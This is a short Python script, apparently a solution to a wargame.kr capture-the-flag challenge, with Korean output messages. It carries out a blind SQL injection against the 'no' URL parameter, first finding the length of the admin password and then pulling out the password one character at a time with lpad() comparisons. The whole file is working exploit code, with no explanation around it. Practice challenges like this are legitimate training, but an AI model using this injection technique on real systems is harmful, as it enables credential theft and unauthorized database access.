from requests import *
result=''
count=0
for i in range(40):
    url=f'http://wargame.kr:8080/jff3_magic/?no=4 || length(pw)={i}'
    response=get(url=url)
    if response.text.find('admin') != -1:
        print('admin pw 길이:',i)
        leng=i
        break
for i in range(1,leng+1):
    if count > 100:
        print('error')
        break
    for j in range(30,128):
        if i==1:
            k=chr(j)
            url=f'http://wargame.kr:8080/jff3_magic/?no=4 || lpad(pw,{i},1)=\'{k}\''
            response=get(url=url)
            count+=1
            if response.text.find('admin') != -1:
                result+=k
                count=0
                break
        else:
            k=chr(j)
            url=f'http://wargame.kr:8080/jff3_magic/?no=4 || lpad(pw,{i},1)=\'{result+k}\''
            response=get(url=url)
            count+=1
            if response.text.find('admin') != -1:
                result+=k
                count=0
                break
print(result)
